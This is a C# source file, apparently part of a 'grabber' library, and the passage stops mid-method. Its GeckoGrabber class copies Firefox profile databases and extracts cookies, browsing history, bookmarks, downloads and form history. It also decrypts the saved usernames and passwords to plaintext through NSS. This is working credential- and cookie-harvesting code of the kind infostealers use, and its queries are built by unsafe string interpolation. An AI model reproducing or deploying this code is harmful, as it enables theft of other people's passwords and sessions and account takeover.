using CockyGrabber.Utility;
using CockyGrabber.Utility.Cryptography;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Web.Script.Serialization;

namespace CockyGrabber.Grabbers
{
    public class GeckoGrabber
    {
        private const string CookieQuery = "SELECT id,originAttributes,name,value,host,path,expiry,lastAccessed,creationTime,isSecure,isHttpOnly,inBrowserElement,sameSite,rawSameSite,schemeMap FROM moz_cookies";
        private const string HistoryQuery = "SELECT id,url,title,rev_host,visit_count,hidden,typed,frecency,last_visit_date,guid,foreign_count,url_hash,description,preview_image_url,origin_id,site_name FROM moz_places";
        private const string BookmarkQuery = "SELECT id,type,fk,parent,position,title,keyword_id,folder_type,dateAdded,lastModified,guid,syncStatus,syncChangeCounter FROM moz_bookmarks";
        private const string DownloadQuery = "SELECT id,place_id,anno_attribute_id,content,flags,expiration,type,dateAdded,lastModified FROM moz_annos";
        private const string FormHistoryQuery = "SELECT id,fieldname,value,timesUsed,firstUsed,lastUsed,guid FROM moz_formhistory";
        private const string CookiePath = "\\cookies.sqlite";
        private const string LoginPath = "\\logins.json";
        private const string PlacesPath = "\\places.sqlite";
        private const string FormHistoryPath = "\\formhistory.sqlite";
        private const string AutoFillProfilesPath = "\\autofill-profiles.json";
        public virtual string ProfileDirPath { get; set; }

        private readonly JavaScriptSerializer JSON_Serializer = new JavaScriptSerializer();
        private readonly IEnumerable<string> _profiles;
        public string[] Profiles
        {
            get => _profiles.ToArray();
        }

        public GeckoGrabber()
        {
            // Check if the profile directory exists:
            if (!Directory.Exists(ProfileDirPath))
                throw new GrabberException(GrabberError.ProfilesNotFound, $"The gecko profile directory couldn't be found: {ProfileDirPath}");
            
            // Get all profile paths:
            _profiles = Directory.GetDirectories(ProfileDirPath);
            
            JSON_Serializer.RegisterConverters(new[] { new DynamicJsonConverter() }); // Register DynamicJsonConverter for dynamic JSON (De)Serialisation
        }

        #region IO Functions
        /// <summary>
        /// Copies a file to a temporary location in %temp%
        /// </summary>
        /// <param name="path">Path to the file that should be copied to a temporary location</param>
        /// <returns>The path to the temp file</returns>
        private string CopyToTempFile(string path)
        {
            string tempFilePath = GetTempFilePath();
            if (File.Exists(tempFilePath)) // If File already exists:
                return CopyToTempFile(path); // Repeat previous steps
            File.Copy(path, tempFilePath);
            return tempFilePath;
        }

        /// <summary>
        /// Create an imaginary path to a temporary file in %temp%
        /// </summary>
        /// <returns>The path to the temp file</returns>
        private string GetTempFilePath() => Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString()); // This is better than Path.GetTempFileName() because GetTempFileName is most of the time inaccurate

        /// <summary>
        /// Returns a value depending on if the database with the stored cookies was found on a specific browser profile.
        /// </summary>
        /// <param name="profile">The path to the browser profile directory.</param>
        /// <returns>True if the cookies exist.</returns>
        public bool CookiesExist(string profile) => File.Exists(profile + CookiePath);
        /// <summary>
        /// Returns a value depending on if any databases with stored cookies were found (on any profile; given that profiles are supported on the browser).
        /// </summary>
        /// <returns>True if the cookies exist.</returns>
        public bool AnyCookiesExist()
        {
            foreach (string profile in _profiles)
                if (CookiesExist(profile)) return true;
            return false;
        }

        /// <summary>
        /// Returns a value depending on if the database with the stored logins was found on a specific browser profile.
        /// </summary>
        /// <param name="profile">The path to the browser profile directory.</param>
        /// <returns>True if the logins exist.</returns>
        public bool LoginsExist(string profile) => File.Exists(profile + LoginPath);
        /// <summary>
        /// Returns a value depending on if any databases with stored logins were found (on any profile; given that profiles are supported on the browser).
        /// </summary>
        /// <returns>True if the logins exist.</returns>
        public bool AnyLoginsExist()
        {
            foreach (string profile in _profiles)
                if (LoginsExist(profile)) return true;
            return false;
        }

        /// <summary>
        /// Returns a value depending on if the database with the stored browser history was found on a specific browser profile.
        /// </summary>
        /// <param name="profile">The path to the browser profile directory.</param>
        /// <returns>True if the history exist.</returns>
        public bool HistoryExists(string profile) => File.Exists(profile + PlacesPath);
        /// <summary>
        /// Returns a value depending on if any databases with stored browser history were found (on any profile; given that profiles are supported on the browser).
        /// </summary>
        /// <returns>True if the history exist.</returns>
        public bool AnyHistoryExists()
        {
            foreach (string profile in _profiles)
                if (HistoryExists(profile)) return true;
            return false;
        }

        /// <summary>
        /// Returns a value depending on if the database with the stored browser bookmarks was found on a specific browser profile.
        /// </summary>
        /// <param name="profile">The path to the browser profile directory.</param>
        /// <returns>True if the bookmarks exist.</returns>
        public bool BookmarksExist(string profile) => File.Exists(profile + PlacesPath);
        /// <summary>
        /// Returns a value depending on if any databases with stored browser bookmarks were found (on any profile; given that profiles are supported on the browser).
        /// </summary>
        /// <returns>True if the bookmarks exist.</returns>
        public bool AnyBookmarksExist()
        {
            foreach (string profile in _profiles)
                if (BookmarksExist(profile)) return true;
            return false;
        }

        /// <summary>
        /// Returns a value depending on if the database with the stored downloads was found on a specific browser profile.
        /// </summary>
        /// <param name="profile">The path to the browser profile directory.</param>
        /// <returns>True if the downloads exist.</returns>
        public bool DownloadsExist(string profile) => File.Exists(profile + PlacesPath);
        /// <summary>
        /// Returns a value depending on if any databases with stored downloads were found (on any profile; given that profiles are supported on the browser).
        /// </summary>
        /// <returns>True if the downloads exist.</returns>
        public bool AnyDownloadsExist()
        {
            foreach (string profile in _profiles)
                if (DownloadsExist(profile)) return true;
            return false;
        }

        /// <summary>
        /// Returns a value depending on if the database with the stored form history was found on a specific browser profile.
        /// </summary>
        /// <param name="profile">The path to the browser profile directory.</param>
        /// <returns>True if the form history database exist.</returns>
        public bool FormHistoryExists(string profile) => File.Exists(profile + FormHistoryPath);
        /// <summary>
        /// Returns a value depending on if any databases with stored form history were found (on any profile; given that profiles are supported on the browser).
        /// </summary>
        /// <returns>True if the form history database exist.</returns>
        public bool AnyFormHistoryExists()
        {
            foreach (string profile in _profiles)
                if (FormHistoryExists(profile)) return true;
            return false;
        }

        /// <summary>
        /// Returns a value depending on if the file called "autofill-profiles.json" was found on a specific browser profile.
        /// </summary>
        /// <param name="profile">The path to the browser profile directory.</param>
        /// <returns>True if the file exist.</returns>
        public bool AutoFillProfilesExists(string profile) => File.Exists(profile + AutoFillProfilesPath);
        /// <summary>
        /// Returns a value depending on if any files called "autofill-profiles.json" were found (on any profile; given that profiles are supported on the browser).
        /// </summary>
        /// <returns>True if the file exist.</returns>
        public bool AnyAutoFillProfilesExists()
        {
            foreach (string profile in _profiles)
                if (AutoFillProfilesExists(profile)) return true;
            return false;
        }

        /// <summary>
        /// Returns a value depending on if all files relevant for the gathering of data that store any type of browser information exist.
        /// </summary>
        /// <returns>True if the file with the key exist.</returns>
        public bool EverythingExists() => AnyCookiesExist() && AnyLoginsExist() && AnyHistoryExists() && AnyBookmarksExist() && AnyDownloadsExist() && AnyFormHistoryExists() && AnyAutoFillProfilesExists();

        #endregion

        #region GetCookies()
        public IEnumerable<Gecko.Cookie> GetCookiesBy(Gecko.Cookie.Header by, object value)
        {
            List<Gecko.Cookie> cookies = new List<Gecko.Cookie>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
            if (!AnyCookiesExist()) throw new GrabberException(GrabberError.CookiesNotFound, $"No cookies were found!"); // Throw an Exception if no cookies were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!CookiesExist(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + CookiePath);

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"{CookieQuery} WHERE {by} = '{value}'";

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            cookies.Add(new Gecko.Cookie()
                            {
                                Id = reader.GetInt32(0),
                                OriginAttributes = reader.GetString(1),
                                Name = reader.GetString(2),
                                Value = reader.GetString(3),
                                Host = reader.GetString(4),
                                Path = reader.GetString(5),
                                Expiry = Time.FromUnixTimeSeconds(reader.GetInt64(6)),
                                LastAccessed = Time.FromUnixTimeMicroseconds(reader.GetInt64(7)),
                                CreationTime = Time.FromUnixTimeMicroseconds(reader.GetInt64(8)),
                                IsSecure = reader.GetBoolean(9),
                                IsHttpOnly = reader.GetBoolean(10),
                                InBrowserElement = reader.GetBoolean(11),
                                SameSite = (Gecko.Cookie.SameSiteType)reader.GetInt16(12),
                                RawSameSite = reader.GetInt16(13),
                                SchemeMap = reader.GetInt16(14),
                            });
                        }
                    }
                    conn.Dispose();
                }
                File.Delete(tempFile);
            });

            return cookies;
        }

        public IEnumerable<Gecko.Cookie> GetCookies()
        {
            List<Gecko.Cookie> cookies = new List<Gecko.Cookie>();
            if (!AnyCookiesExist()) throw new GrabberException(GrabberError.CookiesNotFound, $"No cookie databases were found!"); // Throw an Exception if no cookie DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!CookiesExist(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + CookiePath);

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = CookieQuery;

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            cookies.Add(new Gecko.Cookie()
                            {
                                Id = reader.GetInt32(0),
                                OriginAttributes = reader.GetString(1),
                                Name = reader.GetString(2),
                                Value = reader.GetString(3),
                                Host = reader.GetString(4),
                                Path = reader.GetString(5),
                                Expiry = Time.FromUnixTimeSeconds(reader.GetInt64(6)),
                                LastAccessed = Time.FromUnixTimeMicroseconds(reader.GetInt64(7)),
                                CreationTime = Time.FromUnixTimeMicroseconds(reader.GetInt64(8)),
                                IsSecure = reader.GetBoolean(9),
                                IsHttpOnly = reader.GetBoolean(10),
                                InBrowserElement = reader.GetBoolean(11),
                                SameSite = (Gecko.Cookie.SameSiteType)reader.GetInt16(12),
                                RawSameSite = reader.GetInt16(13),
                                SchemeMap = reader.GetInt16(14),
                            });
                        }
                    }
                    conn.Dispose();
                }
                File.Delete(tempFile);
            });

            return cookies;
        }
        #endregion

        #region GetLogins()
        /// <summary>
        /// Converts the as parameter passed dynamic object to a list of Logins
        /// </summary>
        /// <param name="logins">dynamic json object</param>
        /// <returns>A list of Gecko Logins</returns>
        private static List<Gecko.Login> ConvertDynamicObjectsToLogins(List<object> logins)
        {
            List<Gecko.Login> _logins = new List<Gecko.Login>();
            foreach (dynamic obj in logins)
            {
                _logins.Add(new Gecko.Login
                {
                    Id = (int)obj.id,
                    Hostname = (string)obj.hostname,
                    HttpRealm = (string)obj.httpRealm,
                    FormSubmitURL = (string)obj.formSubmitURL,
                    UsernameField = (string)obj.usernameField,
                    PasswordField = (string)obj.passwordField,
                    EncryptedUsername = (string)obj.encryptedUsername,
                    DecryptedUsername = GeckoDecryptor.DecryptValue((string)obj.encryptedUsername),
                    EncryptedPassword = (string)obj.encryptedPassword,
                    DecryptedPassword = GeckoDecryptor.DecryptValue((string)obj.encryptedPassword),
                    Guid = (string)obj.guid,
                    EncType = (short)obj.encType,
                    TimeCreated = Time.FromUnixTimeMilliseconds((long)obj.timeCreated),
                    TimeLastUsed = Time.FromUnixTimeMilliseconds((long)obj.timeLastUsed),
                    TimePasswordChanged = Time.FromUnixTimeMilliseconds((long)obj.timePasswordChanged),
                    TimesUsed = (uint)obj.timesUsed,
                });
            }
            return _logins;
        }

        public IEnumerable<Gecko.Login> GetLogins()
        {
            List<Gecko.Login> logins = new List<Gecko.Login>();
            if (!AnyLoginsExist()) throw new GrabberException(GrabberError.LoginsNotFound, $"No login files were found!"); // Throw an Exception if no logins were found

            // Get ProgramFiles Path:
            string programFiles = Environment.GetEnvironmentVariable("ProgramW6432");
            if (string.IsNullOrEmpty(programFiles))
                programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);

            // Load NSS:
            if (!GeckoDecryptor.LoadNSS(programFiles + @"\Mozilla Firefox")) throw new GrabberException(GrabberError.Nss3NotFound, "NSS3 couldn't be loaded!"); // Throw an exception if NSS3 couldn't be loaded

            foreach (string profile in _profiles)
            {
                if (!LoginsExist(profile)) continue;

                if (!GeckoDecryptor.SetProfile(profile)) throw new GrabberException(GrabberError.CouldNotSetProfile, $"Profile could not be set: {profile}"); // Throw an Exception if the firefox profile couldn't be set

                dynamic json = JSON_Serializer.Deserialize(File.ReadAllText(profile + LoginPath), typeof(object));
                List<Gecko.Login> _logins = ConvertDynamicObjectsToLogins(json.logins);
                logins.AddRange(_logins);
            }
            GeckoDecryptor.UnLoadNSS(); // Unload NSS
            return logins;
        }

        public IEnumerable<Gecko.Login> GetLoginsBy(Gecko.Login.Header by, object value)
        {
            List<Gecko.Login> logins = new List<Gecko.Login>();
            if (value == null) throw new ArgumentNullException("value"); // Throw a ArgumentNullException if value was not defined
            if (!AnyLoginsExist()) throw new GrabberException(GrabberError.LoginsNotFound, $"No login files were found!"); // Throw an Exception if no logins were found

            // Get ProgramFiles Path:
            string programFiles = Environment.GetEnvironmentVariable("ProgramW6432");
            if (string.IsNullOrEmpty(programFiles))
                programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);

            // Load NSS:
            if (!GeckoDecryptor.LoadNSS(programFiles + @"\Mozilla Firefox")) throw new GrabberException(GrabberError.Nss3NotFound, "NSS3 couldn't be loaded!"); // Throw an exception if NSS3 couldn't be loaded

            foreach (string profile in _profiles)
            {
                if (!LoginsExist(profile)) continue;

                if (!GeckoDecryptor.SetProfile(profile)) throw new GrabberException(GrabberError.CouldNotSetProfile, $"Profile could not be set: {profile}"); // Throw an Exception if the firefox profile couldn't be set

                dynamic json = JSON_Serializer.Deserialize(File.ReadAllText(profile + LoginPath), typeof(object));
                foreach (Gecko.Login l in ConvertDynamicObjectsToLogins(json.logins))
                {
                    switch (by)
                    {
                        case Gecko.Login.Header.id:
                            if (l.Id == (int)value) logins.Add(l);
                            break;
                        case Gecko.Login.Header.hostname:
                            if (l.Hostname == (string)value) logins.Add(l);
                            break;
                        case Gecko.Login.Header.httpRealm:
                            if (l.HttpRealm == (string)value) logins.Add(l);
                            break;
                        case Gecko.Login.Header.formSubmitURL:
                            if (l.FormSubmitURL == (string)value) logins.Add(l);
                            break;
                        case Gecko.Login.Header.usernameField:
                            if (l.UsernameField == (string)value) logins.Add(l);
                            break;
                        case Gecko.Login.Header.passwordField:
                            if (l.PasswordField == (string)value) logins.Add(l);
                            break;
                        case Gecko.Login.Header.encryptedUsername:
                            if (l.EncryptedUsername == (string)value) logins.Add(l);
                            break;
                        case Gecko.Login.Header.encryptedPassword:
                            if (l.EncryptedPassword == (string)value) logins.Add(l);
                            break;
                        case Gecko.Login.Header.guid:
                            if (l.Guid == (string)value) logins.Add(l);
                            break;
                        case Gecko.Login.Header.encType:
                            if (l.EncType == (short)value) logins.Add(l);
                            break;
                        case Gecko.Login.Header.timeCreated:
                            if (l.TimeCreated == Time.FromUnixTimeMilliseconds((long)value)) logins.Add(l);
                            break;
                        case Gecko.Login.Header.timeLastUsed:
                            if (l.TimeLastUsed == Time.FromUnixTimeMilliseconds((long)value)) logins.Add(l);
                            break;
                        case Gecko.Login.Header.timePasswordChanged:
                            if (l.TimePasswordChanged == Time.FromUnixTimeMilliseconds((long)value)) logins.Add(l);
                            break;
                        case Gecko.Login.Header.timesUsed:
                            if (l.TimesUsed == (int)value) logins.Add(l);
                            break;
                    }
                }
            }
            GeckoDecryptor.UnLoadNSS(); // Unload NSS
            return logins;
        }
        #endregion

        #region GetHistory()
        public IEnumerable<Gecko.Site> GetHistoryBy(Gecko.Site.Header by, object value)
        {
            List<Gecko.Site> history = new List<Gecko.Site>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
            if (!AnyHistoryExists()) throw new GrabberException(GrabberError.HistoryNotFound, $"No history databases were found!"); // Throw an Exception if no history DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!HistoryExists(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + PlacesPath);

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"{HistoryQuery} WHERE {by} = '{value}'";

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            history.Add(new Gecko.Site()
                            {
                                Id = reader.GetInt32(0),
                                Url = reader.GetString(1),
                                Title = reader[2].Equals(DBNull.Value) ? null : reader.GetString(2),
                                RevHost = reader.GetString(3),
                                VisitCount = reader.GetInt32(4),
                                IsHidden = reader.GetBoolean(5),
                                IsTyped = reader.GetBoolean(6),
                                Frecency = reader.GetInt32(7),
                                LastVisitDate = reader[8].Equals(DBNull.Value) ? DateTimeOffset.MinValue : Time.FromUnixTimeMicroseconds(reader.GetInt64(8)),
                                Guid = reader.GetString(9),
                                ForeignCount = reader.GetInt32(10),
                                UrlHash = reader.GetInt64(11),
                                Description = reader[12].Equals(DBNull.Value) ? null : reader.GetString(12),
                                PreviewImageUrl = reader[13].Equals(DBNull.Value) ? null : reader.GetString(13),
                                Originid = reader.GetInt32(14),
                                SiteName = reader[15].Equals(DBNull.Value) ? null : reader.GetString(15),
                            });
                        }
                    }
                    conn.Dispose();
                }
                File.Delete(tempFile);
            });
            return history;
        }

        public IEnumerable<Gecko.Site> GetHistory()
        {
            List<Gecko.Site> history = new List<Gecko.Site>();
            if (!AnyHistoryExists()) throw new GrabberException(GrabberError.HistoryNotFound, $"No history databases were found!"); // Throw an Exception if no history DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!HistoryExists(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + PlacesPath);

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = HistoryQuery;

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            history.Add(new Gecko.Site()
                            {
                                Id = reader.GetInt32(0),
                                Url = reader.GetString(1),
                                Title = reader[2].Equals(DBNull.Value) ? null : reader.GetString(2),
                                RevHost = reader.GetString(3),
                                VisitCount = reader.GetInt32(4),
                                IsHidden = reader.GetBoolean(5),
                                IsTyped = reader.GetBoolean(6),
                                Frecency = reader.GetInt32(7),
                                LastVisitDate = reader[8].Equals(DBNull.Value) ? DateTimeOffset.MinValue : Time.FromUnixTimeMicroseconds(reader.GetInt64(8)),
                                Guid = reader.GetString(9),
                                ForeignCount = reader.GetInt32(10),
                                UrlHash = reader.GetInt64(11),
                                Description = reader[12].Equals(DBNull.Value) ? null : reader.GetString(12),
                                PreviewImageUrl = reader[13].Equals(DBNull.Value) ? null : reader.GetString(13),
                                Originid = reader.GetInt32(14),
                                SiteName = reader[15].Equals(DBNull.Value) ? null : reader.GetString(15),
                            });
                        }
                    }
                    conn.Dispose();
                }
                File.Delete(tempFile);
            });
            return history;
        }
        #endregion

        #region GetBookmarks()
        public IEnumerable<Gecko.Bookmark> GetBookmarksBy(Gecko.Bookmark.Header by, object value)
        {
            List<Gecko.Bookmark> bookmarks = new List<Gecko.Bookmark>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
            if (!AnyBookmarksExist()) throw new GrabberException(GrabberError.BookmarksNotFound, $"No bookmark databases were found!"); // Throw an Exception if no bookmark DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!BookmarksExist(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + PlacesPath);

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"{BookmarkQuery} WHERE {by} = '{value}'";

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            // If the foreign key is null: continue because this is not a bookmark but a bookmark tag
                            if (reader[2].Equals(DBNull.Value))
                                continue;
                            // If title is null: continue
                            if (reader[5].Equals(DBNull.Value))
                                continue;

                            using (var _cmd = conn.CreateCommand())
                            {
                                // Get the URL of the bookmark which is stored in a different table (moz_places) than the bookmark table (moz_bookmarks):
                                int fk = reader.GetInt32(2); // Get foreign key
                                _cmd.CommandText = $"SELECT url FROM moz_places WHERE id = '{fk}'";

                                bookmarks.Add(new Gecko.Bookmark()
                                {
                                    Id = reader.GetInt32(0),
                                    Type = reader.GetInt32(1),
                                    ForeignKey = fk,
                                    Parent = reader.GetInt32(3),
                                    Position = reader.GetInt32(4),
                                    Title = reader[5].Equals(DBNull.Value) ? null : reader.GetString(5),
                                    KeywordId = reader[6].Equals(DBNull.Value) ? 0 : reader.GetInt32(6),
                                    FolderType = reader[7].Equals(DBNull.Value) ? null : reader.GetString(7),
                                    DateAdded = Time.FromUnixTimeMicroseconds(reader.GetInt64(8)),
                                    LastModified = Time.FromUnixTimeMicroseconds(reader.GetInt64(9)),
                                    Guid = reader.GetString(10),
                                    SyncStatus = reader.GetInt32(11),
                                    SyncChangeCounter = reader.GetInt32(12),

                                    Url = (string)_cmd.ExecuteScalar(),
                                });
                            }
                        }
                    }
                    conn.Dispose();
                }
                File.Delete(tempFile);
            });
            return bookmarks;
        }

        public IEnumerable<Gecko.Bookmark> GetBookmarks()
        {
            List<Gecko.Bookmark> bookmarks = new List<Gecko.Bookmark>();
            if (!AnyBookmarksExist()) throw new GrabberException(GrabberError.BookmarksNotFound, $"No bookmark databases were found!"); // Throw an Exception if no bookmark DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!BookmarksExist(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + PlacesPath);

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = BookmarkQuery;

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            // If the foreign key is null: continue because this is not a bookmark but a bookmark tag
                            if (reader[2].Equals(DBNull.Value))
                                continue;
                            // If title is null: continue
                            if (reader[5].Equals(DBNull.Value))
                                continue;

                            using (var _cmd = conn.CreateCommand())
                            {
                                // Get the URL of the bookmark which is stored in a different table (moz_places) than the bookmark table (moz_bookmarks):
                                int fk = reader.GetInt32(2); // Get foreign key
                                _cmd.CommandText = $"SELECT url FROM moz_places WHERE id = '{fk}'";

                                bookmarks.Add(new Gecko.Bookmark()
                                {
                                    Id = reader.GetInt32(0),
                                    Type = reader.GetInt32(1),
                                    ForeignKey = fk,
                                    Parent = reader.GetInt32(3),
                                    Position = reader.GetInt32(4),
                                    Title = reader[5].Equals(DBNull.Value) ? null : reader.GetString(5),
                                    KeywordId = reader[6].Equals(DBNull.Value) ? 0 : reader.GetInt32(6),
                                    FolderType = reader[7].Equals(DBNull.Value) ? null : reader.GetString(7),
                                    DateAdded = Time.FromUnixTimeMicroseconds(reader.GetInt64(8)),
                                    LastModified = Time.FromUnixTimeMicroseconds(reader.GetInt64(9)),
                                    Guid = reader.GetString(10),
                                    SyncStatus = reader.GetInt32(11),
                                    SyncChangeCounter = reader.GetInt32(12),

                                    Url = (string)_cmd.ExecuteScalar(),
                                });
                            }
                        }
                    }
                    conn.Dispose();
                }
                File.Delete(tempFile);
            });
            return bookmarks;
        }
        #endregion

        #region GetDownloads()
        public IEnumerable<Gecko.Download> GetDownloadsBy(Gecko.Download.Header by, object value)
        {
            List<Gecko.Download> downloads = new List<Gecko.Download>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
            if (!AnyDownloadsExist()) throw new GrabberException(GrabberError.DownloadsNotFound, $"No download databases were found!"); // Throw an Exception if no download DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!DownloadsExist(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + PlacesPath);

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"{DownloadQuery} WHERE {by} = '{value}'";

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        Gecko.Download temp = new Gecko.Download(); // temp download model
                        while (reader.Read())
                        {
                            int aaId = reader.GetInt32(2); // Get anno attribute id (1 = file, 2 = metadata)
                            string content = reader.GetString(3); // Get content

                            if (aaId == 2) // If anno attribute id is metadata
                            {
                                // Save metadata in variables:
                                string _state = Regex.Match(content, "{\"state\":.+?,").Value;
                                Console.WriteLine(_state);
                                _state = _state.Replace("{\"state\":", null); // Remove {"state":
                                Console.WriteLine(_state.Remove(_state.LastIndexOf(',')));
                                short state = short.Parse(_state.Remove(_state.LastIndexOf(','))); // Remove ',' and parse

                                string _endtime = Regex.Match(content, "\"endTime\":.+?,").Value;
                                _endtime = _endtime.Replace("\"endTime\":", null); // Remove "endTime":
                                long endtime = long.Parse(_endtime.Remove(_endtime.LastIndexOf(','))); // Remove ',' and parse

                                string _filesize = Regex.Match(content, "\"fileSize\":.+?}").Value;
                                _filesize = _filesize.Replace("\"fileSize\":", null); // Remove "fileSize":
                                long filesize = long.Parse(_filesize.Remove(_filesize.LastIndexOf('}'))); // Remove '}' and parse

                                // Add metadata to the temporary download model:
                                temp.State = state;
                                temp.EndTime = Time.FromUnixTimeMicroseconds(endtime);
                                temp.FileSize = filesize;

                                downloads.Add(temp); // Add temporary model to list

                                continue; // skip this one
                            }

                            using (var _cmd = conn.CreateCommand())
                            {
                                // Get the URL of the bookmark which is stored in a different table (moz_places) than the bookmark table (moz_bookmarks):
                                int pId = reader.GetInt32(1); // Get place id
                                _cmd.CommandText = $"SELECT url FROM moz_places WHERE id = '{pId}'";

                                temp = new Gecko.Download()
                                {
                                    Id = reader.GetInt32(0),
                                    PlaceId = pId,
                                    AnnoAttributeId = aaId,
                                    Content = content,
                                    Flags = reader.GetInt16(4),
                                    Expiration = reader.GetInt32(5),
                                    Type = reader.GetInt16(6),
                                    DateAdded = Time.FromUnixTimeMicroseconds(reader.GetInt64(7)),
                                    LastModified = Time.FromUnixTimeMicroseconds(reader.GetInt64(8)),

                                    Url = (string)_cmd.ExecuteScalar(),
                                    Filename = content.Substring(content.LastIndexOf('/') + 1), // Get the substring of the last '/'. Example: file:///C:/Users/User/Downloads/File.zip = File.zip
                                };
                            }
                        }
                    }
                    conn.Dispose();
                }
                File.Delete(tempFile);
            });
            return downloads;
        }

        public IEnumerable<Gecko.Download> GetDownloads()
        {
            List<Gecko.Download> downloads = new List<Gecko.Download>();
            if (!AnyDownloadsExist()) throw new GrabberException(GrabberError.DownloadsNotFound, $"No download databases were found!"); // Throw an Exception if no download DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!DownloadsExist(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + PlacesPath);

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = DownloadQuery;

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        Gecko.Download temp = new Gecko.Download(); // temp download model
                        while (reader.Read())
                        {
                            int aaId = reader.GetInt32(2); // Get anno attribute id (1 = file, 2 = metadata)
                            string content = reader.GetString(3); // Get content

                            if (aaId == 2) // If anno attribute id is metadata
                            {
                                // Save metadata in variables:
                                string _state = Regex.Match(content, "{\"state\":.+?,").Value;
                                _state = _state.Replace("{\"state\":", null); // Remove {"state":
                                short state = short.Parse(_state.Remove(_state.LastIndexOf(','))); // Remove ',' and parse

                                string _endtime = Regex.Match(content, "\"endTime\":.+?,").Value;
                                _endtime = _endtime.Replace("\"endTime\":", null); // Remove "endTime":
                                long endtime = long.Parse(_endtime.Remove(_endtime.LastIndexOf(','))); // Remove ',' and parse

                                string _filesize = Regex.Match(content, "\"fileSize\":.+?}").Value;
                                _filesize = _filesize.Replace("\"fileSize\":", null); // Remove "fileSize":
                                long filesize = long.Parse(_filesize.Remove(_filesize.LastIndexOf('}'))); // Remove '}' and parse

                                // Add metadata to the temporary download model:
                                temp.State = state;
                                temp.EndTime = Time.FromUnixTimeMilliseconds(endtime);
                                temp.FileSize = filesize;

                                downloads.Add(temp); // Add temporary model to list

                                continue; // skip this one
                            }

                            using (var _cmd = conn.CreateCommand())
                            {
                                // Get the URL of the bookmark which is stored in a different table (moz_places) than the bookmark table (moz_bookmarks):
                                int pId = reader.GetInt32(1); // Get place id
                                _cmd.CommandText = $"SELECT url FROM moz_places WHERE id = '{pId}'";

                                temp = new Gecko.Download()
                                {
                                    Id = reader.GetInt32(0),
                                    PlaceId = pId,
                                    AnnoAttributeId = aaId,
                                    Content = content,
                                    Flags = reader.GetInt16(4),
                                    Expiration = reader.GetInt32(5),
                                    Type = reader.GetInt16(6),
                                    DateAdded = Time.FromUnixTimeMicroseconds(reader.GetInt64(7)),
                                    LastModified = Time.FromUnixTimeMicroseconds(reader.GetInt64(8)),

                                    Url = (string)_cmd.ExecuteScalar(),
                                    Filename = content.Substring(content.LastIndexOf('/') + 1), // Get the substring of the last '/'. Example: file:///C:/Users/User/Downloads/File.zip = File.zip
                                };
                            }
                        }
                    }
                    conn.Dispose();
                }
                File.Delete(tempFile);
            });
            return downloads;
        }
        #endregion

        #region GetFormHistory()
        public IEnumerable<Gecko.Form> GetFormHistoryBy(Gecko.Form.Header by, object value)
        {
            List<Gecko.Form> formHistory = new List<Gecko.Form>();
